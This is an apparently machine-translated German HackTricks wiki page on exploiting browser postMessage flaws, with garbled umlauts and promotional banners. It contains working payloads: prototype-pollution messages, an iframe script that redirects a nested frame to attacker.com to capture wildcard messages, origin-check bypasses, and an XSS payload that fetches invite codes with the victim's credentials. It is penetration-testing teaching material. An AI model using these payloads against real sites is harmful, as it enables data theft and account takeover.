# PostMessage-Schwachstellen

## PostMessage-Schwachstellen

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe zu bek√§mpfen, die aus informationsstehlender Malware resultieren.

Sie k√∂nnen ihre Website besuchen und ihren Dienst **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

***

## Sende **PostMessage**

**PostMessage** verwendet die folgende Funktion zum Senden einer Nachricht:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachten Sie, dass **targetOrigin** ein '\*' oder eine URL wie _https://company.com_ sein kann.\
Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (auch wenn der Ursprung des Fensterobjekts unterschiedlich ist).\
Wenn das **Platzhalterzeichen** verwendet wird, k√∂nnen **Nachrichten an jede Domain gesendet** werden und werden an den Ursprung des Fensterobjekts gesendet.

### Angriff auf iframe & Platzhalterzeichen in **targetOrigin**

Wie in [**diesem Bericht**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erkl√§rt, wenn Sie eine Seite finden, die **iframed** werden kann (kein Schutz durch `X-Frame-Header`) und die **sensible** Nachrichten √ºber **postMessage** mit einem **Platzhalterzeichen** (\*) sendet, k√∂nnen Sie den **Ursprung** des **iframe** **√§ndern** und die **sensible** Nachricht an eine von Ihnen kontrollierte Domain **leaken**.\
Beachten Sie, dass wenn die Seite iframed werden kann, aber das **targetOrigin** auf eine URL und nicht auf ein Platzhalterzeichen gesetzt ist, wird dieser **Trick nicht funktionieren**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener Ausnutzung

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages`** erwartet.\
Ein Code √§hnlich dem folgenden wird verwendet:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Beachten Sie in diesem Fall, wie das **erste, was** der Code tut, ist, den **Ursprung zu √ºberpr√ºfen**. Dies ist besonders **wichtig**, wenn die Seite etwas **sensibles** mit den empfangenen Informationen machen soll (wie z.B. ein Passwort √§ndern). **Wenn der Ursprung nicht √ºberpr√ºft wird, k√∂nnen Angreifer Opfer dazu bringen, beliebige Daten an diese Endpunkte zu senden** und die Passw√∂rter der Opfer zu √§ndern (in diesem Beispiel).

### Aufz√§hlung

Um **Ereignislistener** auf der aktuellen Seite zu finden, k√∂nnen Sie:

* **Suchen** Sie den JS-Code nach `window.addEventListener` und `$(window).on` (_JQuery-Version_)
* **F√ºhren** Sie in der Konsole der Entwicklertools aus: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Gehen Sie zu** _Elemente --> Ereignislistener_ in den Entwicklertools des Browsers

![](<../../.gitbook/assets/image (396).png>)

* Verwenden Sie eine **Browsererweiterung** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Diese Browsererweiterungen werden alle Nachrichten **abfangen und Ihnen anzeigen**.

### Umgehen der Ursprungspr√ºfung

* Das Attribut **`event.isTrusted`** gilt als sicher, da es nur `True` f√ºr Ereignisse zur√ºckgibt, die durch echte Benutzeraktionen generiert werden. Obwohl es herausfordernd ist, zu umgehen, wenn es korrekt implementiert ist, ist seine Bedeutung bei Sicherheitspr√ºfungen beachtenswert.
* Die Verwendung von **`indexOf()`** zur Ursprungsvalidierung in PostMessage-Ereignissen kann anf√§llig f√ºr Umgehungen sein. Ein Beispiel, das diese Schwachstelle veranschaulicht, ist:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Die Methode **`search()`** aus `String.prototype.search()` ist f√ºr regul√§re Ausdr√ºcke vorgesehen, nicht f√ºr Zeichenfolgen. Das √úbergeben von etwas anderem als einem RegExp f√ºhrt zu einer impliziten Konvertierung in einen Regex, was die Methode potenziell unsicher macht. Dies liegt daran, dass in Regex ein Punkt (.) als Platzhalter fungiert und das Umgehen der Validierung mit speziell erstellten Domains erm√∂glicht. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Die Funktion **`match()`**, √§hnlich wie `search()`, verarbeitet Regex. Wenn der Regex falsch strukturiert ist, k√∂nnte er anf√§llig f√ºr Umgehungen sein.
* Die Funktion **`escapeHtml`** ist dazu gedacht, Eingaben zu bereinigen, indem Zeichen maskiert werden. Sie erstellt jedoch kein neues maskiertes Objekt, sondern √ºberschreibt die Eigenschaften des vorhandenen Objekts. Dieses Verhalten kann ausgenutzt werden. Insbesondere, wenn ein Objekt so manipuliert werden kann, dass seine gesteuerte Eigenschaft `hasOwnProperty` nicht anerkennt, wird `escapeHtml` nicht wie erwartet funktionieren. Dies wird in den folgenden Beispielen demonstriert:

* Erwartetes Versagen:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Umgehen des Maskierens:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Im Kontext dieser Schwachstelle ist das `File`-Objekt aufgrund seiner schreibgesch√ºtzten `name`-Eigenschaft besonders anf√§llig f√ºr Ausnutzung. Diese Eigenschaft wird in Vorlagen verwendet und nicht von der `escapeHtml`-Funktion bereinigt, was zu potenziellen Sicherheitsrisiken f√ºhrt.
* Die Eigenschaft `document.domain` in JavaScript kann von einem Skript festgelegt werden, um die Domain zu verk√ºrzen und eine entspanntere Durchsetzung der Same-Origin-Richtlinie innerhalb der gleichen √ºbergeordneten Domain zu erm√∂glichen.

### e.origin == window.origin Umgehung

Beim Einbetten einer Webseite in einem **sandboxed iframe** mit %%%%%% ist es wichtig zu verstehen, dass der Ursprung des iframes auf null gesetzt wird. Dies ist besonders wichtig im Umgang mit **Sandbox-Attributen** und deren Auswirkungen auf Sicherheit und Funktionalit√§t.

Durch die Angabe von **`allow-popups`** im Sandbox-Attribut erbt jedes Popup-Fenster, das aus dem iframe ge√∂ffnet wird, die Sandbox-Beschr√§nkungen seines √ºbergeordneten Elements. Dies bedeutet, dass, sofern das Attribut **`allow-popups-to-escape-sandbox`** nicht ebenfalls enthalten ist, der Ursprung des Popup-Fensters ebenfalls auf `null` gesetzt wird, was mit dem Ursprung des iframes √ºbereinstimmt.

Folglich, wenn unter diesen Bedingungen ein Popup ge√∂ffnet wird und eine Nachricht vom iframe an das Popup mit **`postMessage`** gesendet wird, haben sowohl der sendende als auch der empfangende Teil ihren Ursprung auf `null` gesetzt. Diese Situation f√ºhrt dazu, dass **`e.origin == window.origin`** als wahr ausgewertet wird (`null == null`), da sowohl das iframe als auch das Popup den gleichen Ursprungswert von `null` teilen.

F√ºr weitere Informationen **lesen Sie**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Umgehen von e.source

Es ist m√∂glich zu √ºberpr√ºfen, ob die Nachricht aus demselben Fenster stammt, in dem das Skript lauscht (besonders interessant f√ºr **Content Scripts von Browsererweiterungen**, um zu √ºberpr√ºfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Du kannst **`e.source`** einer Nachricht erzwingen, indem du ein **iframe** erstellst, das die **postMessage** sendet und **sofort gel√∂scht** wird.

F√ºr weitere Informationen **lesen Sie:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header Umgehung

Um diese Angriffe durchzuf√ºhren, ist es idealerweise m√∂glich, die Opfer-Webseite in ein `iframe` einzubetten. Aber einige Header wie `X-Frame-Header` k√∂nnen dieses **Verhalten** **verhindern**.\
In solchen Szenarien kannst du dennoch einen weniger unauff√§lligen Angriff durchf√ºhren. Du kannst einen neuen Tab zur verwundbaren Webanwendung √∂ffnen und mit ihr kommunizieren:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stehlen von Nachrichten, die an ein Kind gesendet wurden, indem die Hauptseite blockiert wird

Auf der folgenden Seite k√∂nnen Sie sehen, wie Sie sensible **Postmessage-Daten**, die an ein **Kind-IFrame** gesendet wurden, stehlen k√∂nnen, indem Sie die **Hauptseite blockieren**, bevor die Daten gesendet werden, und einen **XSS im Kind-IFrame** ausnutzen, um die Daten zu **leaken**, bevor sie empfangen werden:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Stehlen von Nachrichten durch √Ñndern des IFrame-Standorts

Wenn Sie eine Webseite ohne X-Frame-Header in ein IFrame einbetten k√∂nnen, das ein anderes IFrame enth√§lt, k√∂nnen Sie den **Standort des Kind-IFrames √§ndern**, sodass, wenn es eine **Postmessage** empf√§ngt, die mit einem **Wildcard** gesendet wurde, ein Angreifer den **Ursprung** dieses IFrames zu einer von ihm **kontrollierten** Seite **√§ndern** und die Nachricht **stehlen** k√∂nnte:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### PostMessage zur Prototyp-Verunreinigung und/oder XSS

In Szenarien, in denen die √ºber `postMessage` gesendeten Daten von JS ausgef√ºhrt werden, k√∂nnen Sie die **Seite** in ein IFrame einbetten und die **Prototyp-Verunreinigung/XSS** ausnutzen, indem Sie den Exploit √ºber `postMessage` senden.

Ein paar **sehr gut erkl√§rte XSS durch `postMessage`** finden Sie unter [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Beispiel f√ºr einen Exploit zur Ausnutzung von **Prototyp-Verunreinigung und dann XSS** √ºber eine `postMessage` an ein `IFrame`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
F√ºr **weitere Informationen**:

* Link zur Seite √ºber [**Prototyp-Verschmutzung**](../deserialization/nodejs-proto-prototype-pollution/)
* Link zur Seite √ºber [**XSS**](../xss-cross-site-scripting/)
* Link zur Seite √ºber [**Client-seitige Prototyp-Verschmutzung zu XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referenzen

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Zum √úben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
